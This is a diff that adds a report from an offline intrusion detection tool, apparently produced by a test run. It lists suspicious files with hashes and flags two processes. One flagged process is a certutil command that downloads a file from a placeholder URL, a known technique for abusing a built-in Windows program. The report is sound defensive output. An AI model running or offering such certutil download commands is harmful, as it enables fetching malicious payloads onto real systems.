@@ -1,0 +1,45 @@
+===== Offline Intrusion Detection System Report =====
+Report Generated At: 2026-03-27 15:39:13
+
+Summary:
+Suspicious Files: 2
+High Entropy Files: 0
+Suspicious Processes: 2
+
+Suspicious Files:
+File: suspicious_scan.json
+Status: Unknown
+Entropy: 5.064568017053352
+High Entropy: false
+Hash: 6b83c6a721b82594a3567e42d088455e37c6094e2eef4f39202fba1613e41000
+
+File: suspicious_scan.txt
+Status: Unknown
+Entropy: 4.758800796572105
+High Entropy: false
+Hash: 534eec298b3e8e149ed88454cc3f650fa4aca5643da66aeab11ad46901427881
+
+Suspicious Processes:
+{
+  "newProcessName": "c:\\windows\\system32\\certutil.exe",
+  "parentProcessName": "c:\\windows\\system32\\cmd.exe",
+  "reasons": [
+    "Known LOLBin executed: certutil.exe",
+    "Unusual parent process: c:\\windows\\system32\\cmd.exe"
+  ],
+  "riskScore": 3,
+  "commandLine": "certutil.exe  -urlcache -split -f https://example.com dummy.exe"
+}
+
+{
+  "newProcessName": "c:\\windows\\system32\\cmd.exe",
+  "parentProcessName": "c:\\windows\\explorer.exe",
+  "reasons": [
+    "Batch or PowerShell script invoked",
+    "Command execution using cmd or PowerShell /c",
+    "Unusual parent process: c:\\windows\\explorer.exe"
+  ],
+  "riskScore": 3,
+  "commandLine": "\"c:\\windows\\system32\\cmd.exe\" /c \"d:\\programming\\java_projects\\offlineintrusiondetectionassistance-main\\src\\app\\test.bat\" "
+}
+
